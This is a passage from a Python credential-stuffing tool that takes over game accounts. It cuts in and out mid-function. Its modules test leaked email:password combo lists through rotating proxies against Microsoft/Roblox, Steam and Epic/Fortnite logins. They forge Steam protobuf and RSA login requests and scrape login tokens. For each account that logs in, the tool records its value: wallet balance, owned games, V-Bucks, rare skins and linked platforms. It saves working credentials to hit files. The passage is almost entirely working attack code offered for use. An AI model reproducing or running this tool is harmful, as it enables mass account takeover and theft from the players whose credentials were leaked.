                         'User-Agent':'Outlook-Android/2.0','Accept':'application/json'},
                timeout=20, proxies=proxies_dict)
            if pr.status_code == 200:
                pd = pr.json()
                if pd.get('accounts'): Country = pd['accounts'][0].get('location','')
                if pd.get('names'): Name = pd['names'][0].get('displayName','')
        return Total, rblx_user, Name, Country
    except: return '0', None, '', ''

def _rblx_profile_data(username, proxies_dict=None):
    try:
        r = requests.post('https://users.roblox.com/v1/usernames/users',
            json={'usernames':[username],'excludeBannedUsers':False}, timeout=10, proxies=proxies_dict)
        if r.status_code != 200 or not r.json().get('data'): return None
        uid = r.json()['data'][0]['id']
        ur = requests.get(f'https://users.roblox.com/v1/users/{uid}', timeout=10, proxies=proxies_dict).json()
        fr = requests.get(f'https://friends.roblox.com/v1/users/{uid}/friends/count', timeout=10, proxies=proxies_dict).json()
        return {'username':username,'banned':'Yes' if ur.get('isBanned') else 'No',
                'created':(ur.get('created','')[:10]),'friends':fr.get('count',0),
                'profile':f'https://www.roblox.com/users/{uid}/profile'}
    except: return None

def _rblx_worker(combo, proxies, writer, cb):
    try:
        email, pw = combo.split(':',1)
        pxd = {'http':pick_proxy(proxies),'https':pick_proxy(proxies)} if proxies else None
        tok, CID, status = _rblx_ms_login(email.strip(), pw.strip(), pxd)
        if status == 'SUCCESS' and tok:
            Total, rblx_user, Name, Country = _rblx_profile(tok, CID, pxd)
            if Total and Total != '0' and rblx_user:
                rd = _rblx_profile_data(rblx_user, pxd)
                if rd:
                    line = (f"{email}:{pw} | RobloxUser:{rd['username']} | "
                            f"Friends:{rd['friends']} | Banned:{rd['banned']} | Created:{rd['created']}")
                    writer.save('Roblox_Hits.txt', line)
                    cb('hit', email, f"ROBLOX:{rd['username']} | Friends:{rd['friends']}")
                else:
                    writer.save('Hotmail_Hits.txt', f'{email}:{pw} | Name:{Name} | Country:{Country}')
                    cb('hit', email, f'Roblox found, no profile | {Name}')
            else:
                writer.save('Hotmail_Hits.txt', f'{email}:{pw} | Name:{Name} | Country:{Country}')
                cb('hit', email, f'{Name} | {Country}')
        else:
            cb('bad', email, status)
    except Exception as e:
        cb('err', combo.split(':',1)[0] if ':' in combo else combo, str(e)[:60])

def run_roblox_bg(combo_file, proxy_file, threads, writer, cb_log, cb_stat, cb_done):
    combos = load_combos(combo_file)
    proxies = load_proxies(proxy_file)
    if not combos: cb_done('No combos found.'); return
    stats = {'hit':0,'2fa':0,'bad':0,'err':0,'done':0}
    lk = Lock()
    def cb(kind, email, info):
        with lk:
            stats[kind if kind in stats else 'err'] += 1
            stats['done'] += 1
        cb_log(kind, email, info)
        cb_stat(dict(stats), len(combos))
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(_rblx_worker, c, proxies, writer, cb) for c in combos]
        for _ in as_completed(futs): pass
    cb_done(f"Done — {stats['hit']} hits | {stats['bad']} bad")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 5 — STEAM
# ═══════════════════════════════════════════════════════════════════════════════
def _varint(v):
    if v < 0: v &= 0xffffffffffffffff
    buf = bytearray()
    while v > 0x7f: buf.append(0x80|(v&0x7f)); v >>= 7
    buf.append(v & 0x7f); return bytes(buf)

def _read_varint(buf, pos):
    result = shift = 0
    while pos < len(buf):
        b = buf[pos]; pos += 1
        result |= (b & 0x7f) << shift
        if not (b & 0x80): break
        shift += 7
    return result, pos

def _pb_str(f, s): d=s.encode() if isinstance(s,str) else s; return _varint((f<<3)|2)+_varint(len(d))+d
def _pb_bytes(f, d): return _varint((f<<3)|2)+_varint(len(d))+d
def _pb_int(f, v): return _varint(f<<3)+_varint(v if v>=0 else v&0xffffffffffffffff)

def _pb_decode(raw):
    out = {}; pos = 0
    while pos < len(raw):
        try: tag, pos = _read_varint(raw, pos)
        except: break
        f, w = tag>>3, tag&7
        if f < 1: break
        if w == 0:
            val, pos = _read_varint(raw, pos)
            prev = out.get(f)
            out[f] = [prev,val] if isinstance(prev,list) else ([prev,val] if prev is not None else val)
        elif w == 2:
            ln, pos = _read_varint(raw, pos)
            if pos+ln > len(raw): break
            chunk = raw[pos:pos+ln]; pos += ln
            prev = out.get(f)
            out[f] = [prev,chunk] if isinstance(prev,list) else ([prev,chunk] if prev is not None else chunk)
        elif w == 5:
            if pos+4 > len(raw): break
            out[f] = struct.unpack_from('<I', raw, pos)[0]; pos += 4
        elif w == 1:
            if pos+8 > len(raw): break
            out[f] = struct.unpack_from('<Q', raw, pos)[0]; pos += 8
        else: break
    return out

def _rsa_encrypt(pw, mod_hex, exp_hex):
    n = int.from_bytes(bytes.fromhex(mod_hex), 'big'); e = int(exp_hex, 16)
    k = len(bytes.fromhex(mod_hex)); raw = pw.encode()
    pad_b = bytes(random.randint(1,255) for _ in range(k-len(raw)-3))
    block = b'\x00\x02' + pad_b + b'\x00' + raw
    c = pow(int.from_bytes(block,'big'), e, n)
    return base64.b64encode(c.to_bytes(k,'big')).decode()

_STEAM_BOUNDARY = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
_STEAM_CT = f'multipart/form-data; boundary={_STEAM_BOUNDARY}'

def _make_form(key, val):
    return (f'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n'
            f'Content-Disposition: form-data; name="{key}"\r\n\r\n{val}\r\n'
            f'------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n').encode()

_STEAM_HDRS = {'Accept':'application/json,text/plain,*/*','Accept-Encoding':'gzip',
               'Connection':'Keep-Alive','User-Agent':'okhttp/4.9.2'}

def _steam_check(username, password, proxy=None):
    s = requests.Session(); s.headers.update(_STEAM_HDRS)
    s.headers['Cookie'] = 'Steam_Language=english'
    if proxy: s.proxies = {'http':proxy,'https':proxy}
    try:
        enc = urlenc.quote(base64.b64encode(_pb_str(1, username)).decode())
        r = s.get(f'https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1'
                  f'?origin=SteamMobile&input_protobuf_encoded={enc}', timeout=15)
        if r.status_code != 200: return {'st':'err','info':f'rsa:{r.status_code}'}
        rd = _pb_decode(r.content)
        mod = rd.get(1,b''); exp = rd.get(2,b''); ts = rd.get(3,0)
        if isinstance(mod,bytes): mod = mod.decode()
        if isinstance(exp,bytes): exp = exp.decode()
        if not mod or not exp: return {'st':'err','info':'rsa empty'}
        ep = _rsa_encrypt(password, mod, exp)
        dev = _pb_str(1,'SM-S256B')+_pb_int(2,3)+_pb_int(3,-500)+_pb_int(4,1)
        auth = (_pb_str(2,username)+_pb_str(3,ep)+_pb_int(4,ts)+_pb_int(5,1)+
                _pb_int(7,1)+_pb_str(8,'Mobile')+_pb_bytes(9,dev)+_pb_int(11,0))
        r = s.post('https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1',
            data=_make_form('input_protobuf_encoded', base64.b64encode(auth).decode()),
            headers={'Content-Type':_STEAM_CT}, timeout=15)
        er = 0
        try: er = int(r.headers.get('X-eresult','0'))
        except: pass
        if er in (5,2): return {'st':'bad'}
        if er in (63,43): return {'st':'ban'}
        if er != 1: return {'st':'err','info':f'eresult={er}'}
        ar = _pb_decode(r.content)
        cid = ar.get(1,0); rid = ar.get(2,b''); sid = ar.get(5,0)
        cfs = ar.get(4,[]); cfs = [cfs] if isinstance(cfs,bytes) else ([] if not isinstance(cfs,list) else cfs)
        ct = []
        for cf in cfs:
            if isinstance(cf,bytes):
                pf = _pb_decode(cf); t2 = pf.get(1,0)
                ct.extend(t2 if isinstance(t2,list) else [t2])
        if any(t in (2,3,4,5,6) for t in ct):
            return {'st':'2fa','sid':str(sid),'types':','.join(str(t) for t in ct)}
        poll_pb = _pb_int(1,cid)+_pb_bytes(2,rid)
        r = s.post('https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1',
            data=_make_form('input_protobuf_encoded', base64.b64encode(poll_pb).decode()),
            headers={'Content-Type':_STEAM_CT,'Accept-Encoding':'identity'}, timeout=15)
        pr = _pb_decode(r.content)
        tok = pr.get(4,b'')
        if isinstance(tok,bytes): tok = tok.decode('utf-8',errors='ignore')
        if not tok: return {'st':'err','info':'no token'}
        parts = tok.split('.')
        if len(parts) < 2: return {'st':'err','info':'bad jwt'}
        payload = parts[1]; rem = len(payload)%4
        if rem: payload += '='*(4-rem)
        try: jwt = json.loads(base64.urlsafe_b64decode(payload))
        except: jwt = {}
        sid_str = str(jwt.get('sub',sid)); sid_int = int(sid_str)
        cookie = (f'Steam_Language=english; '
                  f'steamLoginSecure={sid_str}%7C%7C{urlenc.quote(tok)}; '
                  f'mobileClient=android; mobileClientVersion=777777 3.10.9')
        res = {'st':'hit','sid':sid_str,'country':'','cc':'','level':'','games':0,'balance':'','game_list':[]}
        try:
            cpb = struct.pack('<BQ', 0x09, sid_int)
            r2 = s.post(f'https://api.steampowered.com/IUserAccountService/GetUserCountry/v1?access_token={tok}&spoof_steamid=',
                data=_make_form('input_protobuf_encoded', base64.b64encode(cpb).decode()),
                headers={'Content-Type':_STEAM_CT}, timeout=10)
            cr = _pb_decode(r2.content); cc = cr.get(1,b'')
            if isinstance(cc,bytes): cc = cc.decode()
            res['cc'] = cc; res['country'] = STEAM_COUNTRIES.get(cc,cc)
        except: pass
        try:
            gp = _pb_int(1,sid_int)+_pb_int(2,1)+_pb_int(3,1)+_pb_int(6,0)+_pb_str(7,'english')+_pb_int(8,1)
            s.headers['Cookie'] = cookie
            r3 = s.get(f'https://api.steampowered.com/IPlayerService/GetOwnedGames/v1'
                       f'?access_token={tok}&spoof_steamid=&origin=SteamMobile'
                       f'&input_protobuf_encoded={urlenc.quote(base64.b64encode(gp).decode())}', timeout=10)
            gr = _pb_decode(r3.content); res['games'] = gr.get(1,0)
        except: pass
        try:
            mid = sid_int - 76561197960265728
            s.headers['Cookie'] = cookie
            r4 = s.get(f'https://steamcommunity.com/miniprofile/{mid}/json', timeout=10)
            try:
                mpj = r4.json(); lv = mpj.get('level',mpj.get('player_level',''))
                res['level'] = str(lv) if lv != '' else ''
            except:
                m = re.search(r'friendPlayerLevel\s+(\S+)', r4.text)
                if m: res['level'] = m.group(1)
        except: pass
        try:
            r5 = s.post(f'https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1'
                        f'?access_token={tok}&spoof_steamid=',
                data=_make_form('input_protobuf_encoded','GAE='),
                headers={'Content-Type':_STEAM_CT}, timeout=10)
            wr = _pb_decode(r5.content); bal = wr.get(14,b'')
            if isinstance(bal,bytes): bal = bal.decode('utf-8',errors='ignore')
            elif isinstance(bal,int): bal = str(bal)
            res['balance'] = bal
        except: pass
        if res['games'] == 0 and not res['game_list']: res['st'] = 'free'
        return res
    except requests.exceptions.ProxyError: return {'st':'err','info':'proxy dead'}
    except requests.exceptions.Timeout: return {'st':'err','info':'timeout'}
    except Exception as e: return {'st':'err','info':str(e)[:60]}

def _steam_worker(combo, proxies, writer, cb):
    try:
        parts = combo.strip().split(':',1)
        if len(parts) < 2: cb('bad', combo, 'bad format'); return
        u, p = parts
        res = _steam_check(u.strip(), p.strip(), pick_proxy(proxies))
        st = res['st']
        combo_l = f'{u}:{p}'
        if st == 'hit':
            line = (f"{combo_l} | SteamID:{res['sid']} | Level:{res.get('level','?')} | "
                    f"Games:{res.get('games',0)} | Wallet:{res.get('balance','N/A')} | "
                    f"Country:{res.get('country',res.get('cc','?'))}")
            writer.save('hits.txt', line)
            cb('hit', u, f"SID:{res['sid']} | Lv:{res.get('level','?')} | Games:{res.get('games',0)} | {res.get('country','?')}")
        elif st == 'free':
            writer.save('free.txt', f"{combo_l} | SteamID:{res['sid']}")
            cb('hit', u, f"FREE SteamID:{res['sid']}")
        elif st == '2fa':
            writer.save('2fa.txt', f"{combo_l} | SteamID:{res.get('sid','?')}")
            cb('2fa', u, f"2FA types:{res.get('types','?')}")
        elif st == 'ban':
            cb('bad', u, 'BANNED')
        elif st == 'bad':
            cb('bad', u, 'invalid')
        else:
            cb('err', u, res.get('info','?'))
    except Exception as e:
        cb('err', combo[:30], str(e)[:60])

def run_steam_bg(combo_file, proxy_file, threads, writer, cb_log, cb_stat, cb_done):
    pairs = []
    if combo_file and os.path.exists(combo_file):
        with open(combo_file, 'r', errors='ignore') as f:
            for l in f:
                l = l.strip()
                if ':' in l: u,p = l.split(':',1); pairs.append(f'{u.strip()}:{p.strip()}')
    proxies = load_proxies(proxy_file)
    if not pairs: cb_done('No combos found.'); return
    stats = {'hit':0,'2fa':0,'bad':0,'err':0,'done':0}
    lk = Lock()
    def cb(kind, email, info):
        with lk:
            stats[kind if kind in stats else 'err'] += 1
            stats['done'] += 1
        cb_log(kind, email, info)
        cb_stat(dict(stats), len(pairs))
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(_steam_worker, c, proxies, writer, cb) for c in pairs]
        for _ in as_completed(futs): pass
    cb_done(f"Done — {stats['hit']} hits | {stats['2fa']} 2FA | {stats['bad']} bad")

# ═══════════════════════════════════════════════════════════════════════════════
# GUI
# ═══════════════════════════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 6 — FORTNITE FULL CAPTURE  (BoltFN engine — Xbox + Epic Web + MCP)
# ═══════════════════════════════════════════════════════════════════════════════

# ── Canonical API roots ──────────────────────────────────────────────────────
_FN_ACCOUNT_ROOT    = "https://account-public-service-prod.ol.epicgames.com"
_FN_FORTNITE_ROOT   = "https://fortnite-public-service-prod11.ol.epicgames.com"

_FN_OAUTH_TOKEN_URL    = _FN_ACCOUNT_ROOT + "/account/api/oauth/token"
_FN_ACCOUNT_BY_ID_URL  = _FN_ACCOUNT_ROOT + "/account/api/public/account/{account_id}"
_FN_ACCOUNT_EXT_URL    = _FN_ACCOUNT_ROOT + "/account/api/public/account/{account_id}/externalAuths"
_FN_EXCHANGE_GEN_URL   = "https://www.epicgames.com/id/api/exchange/generate"
_FN_REDIRECT_URL       = "https://www.epicgames.com/id/api/redirect"
_FN_CSRF_URL           = "https://www.epicgames.com/id/api/csrf"
_FN_LOGIN_URL          = "https://www.epicgames.com/id/login"
_FN_LOGIN_POST_URL     = "https://www.epicgames.com/id/api/login"
_FN_REPUTATION_URL     = "https://www.epicgames.com/id/api/reputation"

_FN_QUERY_ATHENA      = _FN_FORTNITE_ROOT + "/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=athena&rvn=-1"
_FN_QUERY_COMMON_CORE = _FN_FORTNITE_ROOT + "/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core&rvn=-1"
_FN_STATS_URL         = _FN_FORTNITE_ROOT + "/fortnite/api/stats/accountId/{account_id}/bulk/window/alltime"
_FN_ENTITLEMENTS_URL  = ("https://entitlement-public-service-prod08.ol.epicgames.com"
                          "/entitlement/api/account/{account_id}/entitlements?start=0&count=5000")

# ── Auth constants ──────────────────────────────────────────────────────────
_FN_XBOX_AUTH_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=82023151-c27d-4fb5-8551-10c10724a55e"
    "&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized"
    "&state=&scope=xboxlive.signin&service_entity=undefined"
    "&force_verify=true&response_type=code&display=popup"
)
_FN_EPIC_TOKEN_URL = _FN_OAUTH_TOKEN_URL
_FN_EPIC_BASIC_XBOX = "basic Y2ZhYTE0YzRiZjg3NDRlM2E1ZWY5YTVkNmMzNDU1OGQ6YmNiMGNkMzkyZmNkNGU1MGE3NmFkNDM4NGM2MjA1NDM="
_FN_EPIC_BASIC_EXCH = "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
_FN_MCP_BASE        = _FN_FORTNITE_ROOT + "/fortnite/api/game/v2/profile"
_FN_AUTH_UA         = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
_FN_EPIC_UA         = "Fortnite/++Fortnite+Release-19.10-CL-18520833 Windows/10.0.19043.1.256.64bit"
_FN_BROWSER_UA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
_FN_EPIC_CLIENT_ID  = "ec684b8c687f479fadea3cb2ad83f5c6"

_FN_RE_URLPOST  = re.compile(r'urlPost["\']?\s*:\s*["\']([^"\']+)["\']', re.S)
_FN_RE_PPFT_ESC = re.compile(r'name=\\"PPFT\\"[^>]*value=\\"([^"]+)\\"', re.S)
_FN_RE_PPFT     = re.compile(r'name="PPFT"[^>]*value="([^"]+)"', re.S)
_FN_RE_CSRF     = re.compile(r'name="csrf"[^>]*value="([^"]+)"')
_FN_RE_CSRF_JS  = re.compile(r'"csrf"\s*:\s*"([^"]+)"')

_FN_OG_LIST = ["OG Skull Trooper","OG Ghoul Trooper","OG Aerial Assault Trooper","OG Renegade Raider"]
_FN_RARE_LIST = (
    "Black Knight,Excl Neo Versa,Sparkle Specialist,Blue Squire,The Reaper,Galaxy,IKONIK,Glow,"
    "Royale Bomber,Travis Scott,Astro Jack,Wonder,Wildcat,Chun-Li,Rose Team Leader,Eon,Dark Skully,"
    "Rogue Spider Knight,Omega,Blitz,Havoc,John Wick,Blue Striker,Prodigy,Blue Team Leader,Royal Knight,"
    "Stealth Reflex,Sub Commander,Huntmaster Saber,Royale Knight,World Cup,Rogue Agent,Elite Agent,"
    "Strong Guard,Warpaint,Eddie Brock,Master Chief,Fresh,Reflex"
).split(",")

_FN_FAILURE_KW = [
    "your account or password is incorrect.",
    "that microsoft account doesn't exist. enter a different account",
    "sign in to your microsoft account",
    "please sign in with a microsoft account or create a new account",
    "recover?mkt=","account.live.com/identity/confirm?mkt",
    "email/confirm?mkt","help us protect your account","abuse?mkt=",
]

def _fn_code_from_url(raw):
    try:
        q = parse_qs(urlparse(raw).query)
        return q.get("code", [""])[0]
    except Exception:
        return ""

def _fn_classify(page_url, body):
    combined = (page_url + " " + body).lower()
    if "abuse?mkt=" in combined or "recover?mkt=" in combined:
        return "bad"
    for kw in _FN_FAILURE_KW:
        if kw in combined:
            return "bad"
    return ""

def _fn_parse_athena(body):
    try:
        data = json.loads(body)
    except Exception:
        return [], "", 0, False
    seen = set(); skins = []; last = ""; level = 0; bp = False
    for ch in data.get("profileChanges", []):
        prof = ch.get("profile", {})
        st   = prof.get("stats", {}).get("attributes", {})
        level = st.get("level", 0) or st.get("season_level", 0) or 0
        bp    = bool(st.get("book_purchased", False))
        lm    = st.get("last_match_end_datetime", "")
        if lm:
            last = lm.split("T")[0] if "T" in lm else lm
        for _, item in prof.get("items", {}).items():
            tid = item.get("templateId", "")
            if tid.startswith("AthenaCharacter:"):
                name = tid[len("AthenaCharacter:"):]
                if name not in seen:
                    seen.add(name); skins.append(name)
    return skins, last, level, bp

def _fn_parse_vbucks(body):
    try:
        data = json.loads(body)
    except Exception:
        return 0
    total = 0
    for ch in data.get("profileChanges", []):
        for _, item in ch.get("profile", {}).get("items", {}).items():
            if item.get("templateId", "").startswith("Currency:Mtx"):
                total += item.get("quantity", 0)
    return total

def _fn_check_rare(skins_str):
    og_found, rare_found = [], []; has_og = False
    for skin in skins_str.split(","):
        sl = skin.strip().lower()
        if not sl: continue
        for og in _FN_OG_LIST:
            if og.lower() in sl or sl in og.lower():
                if og not in og_found: og_found.append(og)
                has_og = True
        for rare in _FN_RARE_LIST:
            rl = rare.strip().lower()
            if rl in sl or sl in rl:
                if rare not in rare_found: rare_found.append(rare)
    return has_og, og_found, rare_found

def _fn_capture(s, account_id, token, display_name):
    """Full BoltFN-grade MCP capture: account info, athena, vbucks,
    entitlements, external auths (PSN/Xbox/Nintendo/Steam), stats."""
    bearer      = {"Authorization": "Bearer " + token}
    bearer_json = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
    out = {"account_id": account_id, "display_name": display_name}

    # ── Account details ──────────────────────────────────────────────────────
    try:
        r = s.get(_FN_ACCOUNT_BY_ID_URL.replace("{account_id}", account_id),
                  headers=bearer, timeout=15)
        if r.status_code == 200:
            a = r.json()
            out["display_name"]   = a.get("displayName", display_name)
            out["epic_email"]     = a.get("email", "")
            out["email_verified"] = str(a.get("emailVerified", "false")).lower()
            out["tfa_enabled"]    = str(a.get("tfaEnabled", "false")).lower()
            out["country"]        = a.get("country", "?")
            out["last_login"]     = a.get("lastLogin", "")
            out["created"]        = a.get("createdAt", "")
    except Exception:
        pass

    # ── Reputation / ban check ───────────────────────────────────────────────
    try:
        rr = s.get(_FN_REPUTATION_URL, headers={
            "Authorization": "Bearer " + token,
            "Accept": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": _FN_BROWSER_UA,
        }, timeout=12)
        if rr.status_code == 200:
            rj = rr.json()
            out["reputation"] = rj.get("reputation", rj.get("status", "ok"))
            if rj.get("banned") or rj.get("isBanned"):
                out["reputation"] = "BANNED"
    except Exception:
        pass

    # ── Athena profile (skins, level, battle pass) ───────────────────────────
    try:
        r = s.post(_FN_QUERY_ATHENA.replace("{account_id}", account_id),
                   data="{}", headers=bearer_json, timeout=18)
        if r.status_code == 200:
            skins, last, level, bp = _fn_parse_athena(r.text)
            out["skins_count"]     = len(skins)
            out["skins_list"]      = skins
            out["level"]           = level
            out["battle_pass"]     = bp
            out["total_cosmetics"] = len(skins)
            if last:
                out["last_played"] = last
            has_og, og_list, rare_list = _fn_check_rare(",".join(skins))
            if has_og:
                out["has_og"]    = True
                out["og_skins"]  = og_list
            if rare_list:
                out["rare_skins"] = rare_list
    except Exception:
        pass

    # ── Common core (V-Bucks) ────────────────────────────────────────────────
    try:
        r = s.post(_FN_QUERY_COMMON_CORE.replace("{account_id}", account_id),
                   data="{}", headers=bearer_json, timeout=18)
        if r.status_code == 200:
            out["vbucks"] = _fn_parse_vbucks(r.text)
    except Exception:
        pass

    # ── Entitlements (Save the World) ────────────────────────────────────────
    try:
        r = s.get(_FN_ENTITLEMENTS_URL.replace("{account_id}", account_id),
                  headers=bearer, timeout=15)
        if r.status_code == 200:
            out["has_stw"] = '"entitlementName":"Fortnite_Founder"' in r.text
    except Exception:
        pass

    # ── External auth links (PSN / Xbox / Nintendo / Steam) ──────────────────
    try:
        r = s.get(_FN_ACCOUNT_EXT_URL.replace("{account_id}", account_id),
                  headers=bearer, timeout=15)
        if r.status_code == 200:
            body = r.text
            out["has_psn"]      = '"type":"psn"'       in body
            out["has_xbox"]     = '"type":"xbl"'       in body
            out["has_nintendo"] = '"type":"nintendo"'  in body
            out["has_steam"]    = '"type":"steam"'     in body
    except Exception:
        pass

    # ── Battle Royale stats (wins / kills) ───────────────────────────────────
    try:
        r = s.get(_FN_STATS_URL.replace("{account_id}", account_id),
                  headers=bearer, timeout=15)
        if r.status_code == 200:
            st = r.json()
            out["wins"]  = st.get("br_placetop1_keyboardmouse_m0_default", 0) or 0
            out["kills"] = st.get("br_kills_keyboardmouse_m0_default", 0) or 0
    except Exception:
        pass

    return out

def _fn_grab_csrf(s, body=""):
    """Fetch Epic CSRF token — tries API endpoint first, then cookies, then page regex."""
    try:
        r = s.get(_FN_CSRF_URL, headers={
            "Accept": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": _FN_LOGIN_URL,
        }, timeout=12)
        if r.status_code == 200:
            try:
                j   = r.json()
                tok = j.get("csrf") or j.get("token", "")
                if tok:
                    return tok
            except Exception:
                pass
    except Exception:
        pass
    for name in ("XSRF-TOKEN", "EPIC_CSRF"):
        tok = s.cookies.get(name, "")
        if tok:
            return tok
    for rx in (_FN_RE_CSRF, _FN_RE_CSRF_JS):
        m = rx.search(body)
        if m:
            return m.group(1)
    return ""


def _fn_exchange_code(s):
    """Generate an Epic exchange code from the current authenticated web session."""
    try:
        r = s.get(_FN_EXCHANGE_GEN_URL, headers={
            "Accept": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": _FN_LOGIN_URL,
        }, timeout=12)
        if r.status_code == 200:
            j = r.json()
            code = j.get("code") or j.get("authorizationCode", "")
            if code:
                return code
    except Exception:
        pass
    try:
        r = s.get(
            _FN_REDIRECT_URL + "?clientId=" + _FN_EPIC_CLIENT_ID + "&responseType=code",
            headers={"Referer": _FN_LOGIN_URL, "X-Requested-With": "XMLHttpRequest"},
            timeout=15,
        )
        try:
            j = r.json()
            return j.get("code") or j.get("authorizationCode") or _fn_code_from_url(r.url)
        except Exception:
            return _fn_code_from_url(r.url)
    except Exception:
        return ""


def _fn_token_from_exchange(s, code):
    """Exchange an auth code for an Epic bearer token."""
    try:
        r = s.post(_FN_OAUTH_TOKEN_URL, data={
            "grant_type":    "exchange_code",
            "exchange_code": code,
            "token_type":    "eg1",
        }, headers={
            "Content-Type":  "application/x-www-form-urlencoded",
            "Authorization": _FN_EPIC_BASIC_EXCH,
            "User-Agent":    _FN_EPIC_UA,
        }, timeout=20)
        j = r.json()
        if j.get("access_token"):
            return j
    except Exception:
        pass
    return None


_FN_EPIC_FAIL_KW = [
    "sorry, the credentials you are using are invalid.",
    "sorry, de inloggegevens die u gebruikt zijn ongeldig.",
    "your account is temporarily locked",
    "inactive",
    "please reset your password to proceed with login",
]
_FN_EPIC_SUCCESS_KW = ["account settings", "ajustes de la cuenta",
                        "manage your account data", "sign out"]
_FN_EPIC_2FA_KW     = ["security code", "please click each image",
                        "verification code", "two-factor", "2fa", "captcha"]


def _fn_check_xbox(email, password, s):
    """Xbox OAuth → Epic XBL token path."""
    try:
        r1 = s.get(_FN_XBOX_AUTH_URL, headers={"User-Agent": _FN_AUTH_UA,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
             timeout=20, allow_redirects=True)
        mp = _FN_RE_URLPOST.search(r1.text)
        pp = _FN_RE_PPFT_ESC.search(r1.text) or _FN_RE_PPFT.search(r1.text)
        if not mp or not pp:
            return {"status": "BAD"}

        post_url = mp.group(1).replace("\\/", "/")
        ppft     = pp.group(1)
        form = {
            "i13": "0", "login": email, "loginfmt": email, "type": "11",
            "LoginOptions": "3", "passwd": password, "ps": "2",
            "PPFT": ppft, "PPSX": "Passp", "NewUser": "1", "fspost": "0",
            "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "1",
            "isSignupPost": "0", "isRecoveryAttemptPost": "0",
        }
        r2 = s.post(post_url, data=form, headers={
            "user-agent": _FN_AUTH_UA, "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://login.live.com", "referer": r1.url,
        }, timeout=20, allow_redirects=True)

        if _fn_classify(r2.url, r2.text) == "bad":
            return {"status": "BAD"}

        abl = r2.text.lower()
        if "retry with a different device" in abl:
            return {"status": "ERROR"}
        if ("account.live.com/identity/confirm" in abl or "recover?mkt=" in abl
                or "abuse?mkt=" in abl or "identity/confirm" in r2.url.lower()):
            return {"status": "2FA"}

        xbox_code = _fn_code_from_url(r2.url)
        if not xbox_code:
            for _ in range(3):
                try:
                    rt = s.get(_FN_XBOX_AUTH_URL, headers={"User-Agent": _FN_AUTH_UA},
                               timeout=20, allow_redirects=False)
                    if 301 <= rt.status_code <= 308:
                        c = _fn_code_from_url(rt.headers.get("Location", ""))
                        if c:
                            xbox_code = c
                            break
                except Exception:
                    pass
        if not xbox_code:
            return {"status": "BAD"}

        r3 = s.post(_FN_OAUTH_TOKEN_URL, data={
            "grant_type": "external_auth", "external_auth_type": "xbl",
            "external_auth_token": xbox_code,
        }, headers={
            "Content-Type":  "application/x-www-form-urlencoded",
            "Authorization": _FN_EPIC_BASIC_XBOX,
            "User-Agent":    _FN_EPIC_UA,
        }, timeout=20)

        if r3.status_code == 429:
            return {"status": "ERROR"}
        bs = r3.text
        if ("invalid_external_auth_token" in bs or "account_not_active" in bs
                or "sorry the account you are using is not active" in bs):
            return {"status": "NO_EPIC"}
        if ('correctiveAction":"DATE_OF_BIRTH' in bs or "account_review_details_required" in bs):
            return {"status": "FULL", "data": {
                "display_name": "DOB Required", "vbucks": 0,
                "skins_count": 0, "level": 0, "total_cosmetics": 0, "battle_pass": False,
            }}
        try:
            ej = r3.json()
        except Exception:
            return {"status": "BAD"}

        access_token = ej.get("access_token", "")
        account_id   = ej.get("account_id",   "")
        display_name = ej.get("displayName",  "")
        if not access_token:
            return {"status": "BAD"}

        data    = _fn_capture(s, account_id, access_token, display_name)
        is_free = (int(data.get("skins_count", 0) or 0) == 0
                   and int(data.get("vbucks", 0) or 0) == 0)
        return {"status": "FREE" if is_free else "FULL", "data": data}

    except requests.exceptions.Timeout:
        return {"status": "ERROR"}
    except requests.exceptions.ProxyError:
        return {"status": "ERROR"}
    except Exception as e:
        return {"status": "ERROR", "msg": str(e)[:80]}


def _fn_check_epic_web(email, password, s):
    """Epic web login → exchange code → bearer token path."""
    try:
        s.headers.update({"User-Agent": _FN_BROWSER_UA, "Accept-Language": "en-US,en;q=0.9"})
        r0   = s.get(_FN_LOGIN_URL, timeout=20, allow_redirects=True)
        if r0.status_code != 200:
            return {"status": "ERROR"}
        csrf = _fn_grab_csrf(s, r0.text)

        payload = {"email": email, "password": password,
                   "rememberMe": "true", "csrf": csrf}
        hdrs = {
            "Referer": _FN_LOGIN_URL,
            "Origin":  "https://www.epicgames.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json",
        }
        if csrf:
            hdrs["X-XSRF-TOKEN"] = csrf

        r1 = s.post(_FN_LOGIN_POST_URL, data=payload,
                    headers=hdrs, timeout=20, allow_redirects=True)
        low = (r1.url + " " + r1.text).lower()

        if any(k in low for k in _FN_EPIC_2FA_KW):
            return {"status": "2FA"}
        if any(k in low for k in _FN_EPIC_FAIL_KW):
            return {"status": "BAD"}

        code = _fn_exchange_code(s)
        if not code:
            return {"status": "BAD"}

